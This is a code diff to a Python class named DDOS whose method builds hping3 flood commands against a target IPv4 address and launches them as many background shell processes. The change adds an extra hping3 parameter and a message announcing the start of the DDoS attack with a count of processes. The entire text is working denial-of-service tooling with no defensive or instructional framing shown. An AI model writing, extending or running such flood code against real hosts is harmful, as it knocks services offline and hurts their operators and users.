@@ -34,9 +34,12 @@ class DDOS():
 
     def spawnATKprocess(self):
         for i, val in enumerate(self.ATKPARAMETERS):
-            for j in range(val[3]):
+            for j in range(val[4]):
                 self.ATKcommands.append(
-                    f'hping3 {val[0]} -d {val[1]} {val[2]} {self.TARGETIPv4} &')
+                    f'hping3 {val[0]} -d {val[1]} {val[2]} {val[3]} {self.TARGETIPv4} &')
+        self.length = len(self.ATKcommands)
+        print(
+            f'{bcolors.OKGREEN}Start DDoS attack with {self.length} processes...{bcolors.ENDC}')
         for i, val in enumerate(self.ATKcommands):
             proc = subprocess.Popen(val, shell=True)
             self.PIDs.append(proc.pid)
@@ -45,7 +48,6 @@ class DDOS():
         # register exit handler
         atexit.register(self.killATKprocess)
         #
-        self.length = len(self.PIDs)
         while True:
             time.sleep(1)
 
